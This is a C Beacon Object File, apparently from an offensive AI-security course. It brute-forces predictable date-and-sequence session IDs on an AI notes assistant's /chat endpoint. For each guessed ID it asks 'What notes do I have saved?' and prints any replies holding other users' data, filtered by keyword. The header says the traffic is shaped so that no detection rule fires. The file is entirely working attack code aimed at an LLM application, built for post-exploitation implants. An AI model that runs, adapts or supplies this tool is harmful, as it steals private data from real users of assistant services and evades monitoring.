/*
 * sessionBrute.c — predictable session-id oracle brute (OSAI T3).
 * Course: M3.4.2 — Notes Assistant session ids MC-YYYYMMDD-NNNN (date+seq),
 *   brute /chat for cross-session secrets; skip EMPTY, flag KEYWORD hits.
 *   ATLAS AML.T0024.  Raw-socket HTTP POST loop, no curl child; each request
 *   looks like normal /chat traffic (course: no rule fires). lscope does this
 *   better over HTTP if Python is on the box — BOF for hosts without it.
 *
 * args: str ip, int port, str startDate(YYYYMMDD), int days, int countMax,
 *       str keyword(opt, default built-in set)
 */
#include "aibof.h"
#include <winsock2.h>
#include <ws2tcpip.h>

static int dmon[13] = {0,31,28,31,30,31,30,31,31,30,31,30,31};
static int leap(int y){ return (y%4==0 && y%100!=0) || (y%400==0); }
static void next_day(int* y,int* m,int* d){
  int dm = dmon[*m] + ((*m==2 && leap(*y)) ? 1 : 0);
  (*d)++; if(*d > dm){ *d=1; (*m)++; if(*m>12){*m=1;(*y)++;} }
}
static int i2s(int v, char* s){ char t[12]; int i=0; if(v==0){s[0]='0';s[1]=0;return 1;}
  while(v){ t[i++]='0'+v%10; v/=10; } int n=i; for(int k=0;k<n;k++) s[k]=t[n-1-k]; s[n]=0; return n; }

static int http_post(unsigned int hip,int port,const char* body,char* out,int outmax){
  SOCKET s = WS2_32$socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
  if(s==INVALID_SOCKET) return -1;
  struct sockaddr_in sa; xmemset(&sa, 0, sizeof sa); sa.sin_family=AF_INET;
  sa.sin_addr.S_un.S_addr=bs32(hip); sa.sin_port=bs16((u_short)port);
  if(WS2_32$connect(s,(struct sockaddr*)&sa,sizeof sa)!=0){WS2_32$closesocket(s);return -1;}
  char cl[16]; i2s((int)xlen(body), cl);
  char req[1024]; int o=0;
  const char* h="POST /chat HTTP/1.0\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: ";
  for(int i=0;h[i];i++) req[o++]=h[i];
  for(int i=0;cl[i];i++) req[o++]=cl[i];
  const char* t="\r\nConnection: close\r\n\r\n";
  for(int i=0;t[i];i++) req[o++]=t[i];
  for(int i=0;body[i] && o<1000;i++) req[o++]=body[i];
  WS2_32$send(s,req,o,0);
  int total=0;
  while(total<outmax-1){ int r=WS2_32$recv(s,out+total,outmax-1-total,0); if(r<=0)break; total+=r; }
  out[total]=0; WS2_32$closesocket(s); return total;
}

static int empty_resp(const char* r){
  return buf_contains_ci(r,(int)xlen(r),"haven't saved") ||
         buf_contains_ci(r,(int)xlen(r),"no notes") ||
         buf_contains_ci(r,(int)xlen(r),"haven\\u0027t saved");
}

void go(char* args,int alen){
  datap p; BeaconDataParse(&p,args,alen);
  char* ips = BeaconDataExtract(&p,NULL);
  int port = BeaconDataInt(&p);
  char* sd = BeaconDataExtract(&p,NULL);
  int days = BeaconDataInt(&p);
  int cmax = BeaconDataInt(&p);
  char* kw = BeaconDataExtract(&p,NULL);
  if(!ips||!*ips||!sd||xlen(sd)!=8){ BeaconPrintf(CALLBACK_ERROR,"usage: sessionBrute <ip> <port> <YYYYMMDD> <days> <countMax> [kw]\n"); return; }
  if(port<=0) port=8009; if(days<=0) days=14; if(cmax<=0) cmax=20;
  unsigned int hip=parse_ipv4(ips); if(!hip){BeaconPrintf(CALLBACK_ERROR,"bad ip\n");return;}
  int y=(sd[0]-'0')*1000+(sd[1]-'0')*100+(sd[2]-'0')*10+(sd[3]-'0');
  int m=(sd[4]-'0')*10+(sd[5]-'0'); int d=(sd[6]-'0')*10+(sd[7]-'0');
  if(y<2000||m<1||m>12||d<1||d>31){BeaconPrintf(CALLBACK_ERROR,"bad date\n");return;}

  WSADATA wsa; if(WS2_32$WSAStartup(MAKEWORD(2,2),&wsa)!=0){BeaconPrintf(CALLBACK_ERROR,"wsa\n");return;}
  char* resp=(char*)intAlloc(64*1024); if(!resp){WS2_32$WSACleanup();return;}
  BeaconPrintf(CALLBACK_OUTPUT,"[*] sessionBrute %s:%d from %s days=%d cmax=%d kw=%s\n",ips,port,sd,days,cmax,kw?kw:"-");

  int hits=0,checked=0;
  for(int day=0; day<days; day++){
    for(int n=1;n<=cmax;n++){
      char sid[24]; /* MC-YYYYMMDD-NNNN */
      char ys[5],ms[3],ds[3],ns[5];
      ys[0]=y/1000+'0'; ys[1]=(y/100)%10+'0'; ys[2]=(y/10)%10+'0'; ys[3]=y%10+'0'; ys[4]=0;
      ms[0]=m/10+'0'; ms[1]=m%10+'0'; ms[2]=0;
      ds[0]=d/10+'0'; ds[1]=d%10+'0'; ds[2]=0;
      int nl=i2s(n,ns);
      /* pad ns to 4 digits */
      char np[5]; int pad=4-nl; for(int i=0;i<pad;i++) np[i]='0'; for(int i=0;i<nl;i++) np[pad+i]=ns[i]; np[4]=0;
      int o=0; sid[o++]='M'; sid[o++]='C'; sid[o++]='-';
      for(int i=0;i<4;i++) sid[o++]=ys[i]; for(int i=0;i<2;i++) sid[o++]=ms[i]; for(int i=0;i<2;i++) sid[o++]=ds[i]; sid[o++]='-';
      for(int i=0;i<4;i++) sid[o++]=np[i]; sid[o]=0;

      char body[256];
      const char* pre="{\"message\":\"What notes do I have saved?\",\"session_id\":\"";
      int bi=0; for(int i=0;pre[i];i++) body[bi++]=pre[i];
      for(int i=0;sid[i];i++) body[bi++]=sid[i];
      body[bi++]='"'; body[bi++]='}'; body[bi]=0;

      int r=http_post(hip,port,body,resp,64*1024);
      checked++;
      if(r>0 && !empty_resp(resp)){
        int interesting = (kw && *kw) ? buf_contains_ci(resp,r,kw) : 1;
        if(interesting){
          hits++;
          /* print short snippet of body (skip headers) */
          char* bodyp = xstrstr(resp,"\r\n\r\n");
          char* seg = bodyp ? bodyp+4 : resp;
          char snip[200]; int sl=0; for(; seg[sl] && sl<180; sl++) snip[sl]=seg[sl]; snip[sl]=0;
          BeaconPrintf(CALLBACK_OUTPUT,"[HIT] %s :: %s\n", sid, snip);
        }
      }
    }
    next_day(&y,&m,&d);
  }
  intFree(resp); WS2_32$WSACleanup();
  BeaconPrintf(CALLBACK_OUTPUT,"[*] sessionBrute done checked=%d hits=%d\n",checked,hits);
}